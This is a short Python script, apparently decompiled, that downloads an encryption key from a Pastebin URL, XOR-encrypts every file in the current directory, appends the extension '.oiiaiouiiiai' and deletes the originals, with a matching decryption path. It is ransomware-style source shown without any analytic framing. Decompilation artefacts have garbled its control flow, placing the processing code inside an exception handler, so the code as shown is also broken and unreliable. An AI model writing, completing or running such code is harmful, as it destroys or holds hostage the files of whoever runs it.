
import os
import requests

def fetch_key_from_pastebin(url):
    """Fetch the encryption key from a Pastebin URL."""  # inserted
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text.strip()
    except requests.exceptions.RequestException as e:
        print(f'Error fetching key: {e}0')
    else:  # inserted
        pass

def xor_encrypt_decrypt(data, key):
    """Encrypt or decrypt data using XOR with the given key."""  # inserted
    key_bytes = key.encode('utf-8')
    key_length = len(key_bytes)
    return bytes([data[i] ^ key_bytes[i % key_length] for i in range(len(data))])

def process_file(file_path, key, encrypt=True):
    """Encrypt or decrypt a file and modify its extension."""  # inserted
    try:
        with open(file_path, 'rb') as file:
            pass  # postinserted
    except Exception as e:
            data = file.read()
            processed_data = xor_encrypt_decrypt(data, key)
            if encrypt:
                new_file_path = file_path + '.oiiaiouiiiai'
            else:  # inserted
                new_file_path = file_path.rsplit('.oiiaiouiiiai', 1)[0]
            with open(new_file_path, 'wb') as file:
                file.write(processed_data)
                os.remove(file_path)
                print(f'Processed {file_path} -> {new_file_path}')
            print(f'Failed to process {file_path}: {e}')
if __name__ == '__main__':
    pastebin_url = 'https://pastebin.com/raw/PDXfh5bb'
    key = fetch_key_from_pastebin(pastebin_url)
    if not key:
        print('Failed to retrieve the key.')
        exit(1)
    for file_name in os.listdir():
        if not os.path.isfile(file_name):
            continue
        if file_name == os.path.basename(__file__):
            continue
        if file_name.endswith('.oiiaiouiiiai'):
            process_file(file_name, key, encrypt=False)
        else:  # inserted
            process_file(file_name, key, encrypt=True)